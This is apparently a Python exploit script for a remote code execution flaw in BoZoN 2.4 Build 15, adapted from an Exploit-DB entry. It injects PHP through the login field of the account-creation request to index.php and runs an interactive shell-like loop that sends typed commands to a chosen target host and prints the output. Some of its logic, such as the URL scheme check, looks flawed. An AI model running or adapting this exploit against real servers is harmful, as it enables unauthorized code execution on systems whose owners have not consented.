#!/usr/bin/env python3
#Callum Shanks / Waves
#01/22
#BoZoN 2.4 Build 15 RCE
#Based on https://www.exploit-db.com/exploits/41084



import requests
import argparse
from signal import signal, SIGINT
from sys import exit
from re import sub
from string import hexdigits
from secrets import choice
from time import sleep


def signalHandler(sig, frame):
    print("\n[*] Exiting...")
    exit(0)


class bozon():
    def __init__(self):
        self.session = requests.session()
        nonce = self.rand_passwd()
        self.data = {
            'creation' : '1',
            'login' : '',
            'pass' : f'{nonce}',
            'confirm' : f'{nonce}',
            'token' : ''
        }


    def argparser(self):
        parser = argparse.ArgumentParser(description="BoZoN RCE in username field")
        parser.add_argument("host", help="The target IP address")
        parser.add_argument("--port", "-p", type=int, default=80, help="The target port (default 80)")
        self.args = parser.parse_args()

        self.args.host = sub(":\d+$", "", self.args.host)
        if all(x in self.args.host for x in ["http://", "https://"]):
            self.target = f"{self.args.host}:{self.args.port}"
        else:
            self.target = f"http://{self.args.host}:{self.args.port}"

        self.proxy = {
            'http' : "http://127.0.0.1:8080"
        }


    def rand_passwd(self):
        nonce = hexdigits
        return "".join([choice(nonce) for i in range(20)])


    def exploit(self):
        prompt = "BoZoN: $ "
        while 1:
            cmd = '"];$PWN=''{};//''//"'.format(input(prompt))
            if cmd:
                url = f"{self.target}/index.php"
                self.data['login'] = f'{cmd}'

                req = requests.Request('POST', url, data=self.data)
                prepped = req.prepare()
                res = self.session.send(prepped, proxies=self.proxy)
                del self.session.cookies['PHPSESSID']
                sleep(0.5)
                print(res.text)


if __name__ == "__main__":
    signal(SIGINT, signalHandler)
    exploit = bozon()
    exploit.argparser()
    exploit.exploit()
